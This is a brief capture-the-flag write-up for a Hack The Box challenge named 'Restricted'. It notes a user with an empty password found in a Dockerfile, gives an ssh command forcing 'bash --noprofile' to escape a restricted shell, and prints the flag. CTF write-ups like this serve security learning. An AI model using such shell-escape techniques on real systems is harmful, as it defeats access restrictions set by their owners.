# misc - Restricted

Reading the docker file we can see the user **restricted** and allowed to login with an emptypass 

Once we are in, the shell is restricted, to bypass that run ssh and get into the machine again and we have the power!

![Untitled](https://user-images.githubusercontent.com/88723154/227420079-09b8a81a-fb75-49c0-83d4-7a12769ec7b4.png)


`ssh restricted@139.59.173.68 -p 31265 -t "bash --noprofile"`

### flag: HTB{r35tr1ct10n5_4r3_p0w3r1355}
